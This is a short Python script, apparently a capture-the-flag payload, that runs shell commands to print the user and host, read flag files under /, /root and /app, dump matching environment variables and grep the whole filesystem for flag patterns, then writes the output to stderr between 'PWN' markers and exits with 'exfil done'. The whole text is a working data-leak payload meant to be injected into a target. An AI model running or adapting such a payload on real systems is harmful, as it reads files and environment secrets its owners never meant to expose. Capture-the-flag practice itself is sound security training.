import sys, subprocess
cmd = ("id; hostname; echo ----FLAG----; "
       "cat /flag* /flag.txt /root/flag* /app/flag* 2>/dev/null; "
       "env | grep -iE 'flag|ctf|mptc'; "
       "grep -rIl -m1 -E 'MPTC\\{|flag\\{' / 2>/dev/null | head -n 20")
r = subprocess.run(cmd, shell=True, capture_output=True, text=True)
sys.stderr.write("\n=====PWN_START=====\n" + r.stdout + r.stderr + "\n=====PWN_END=====\n")
sys.stderr.flush()
raise SystemExit("exfil done")
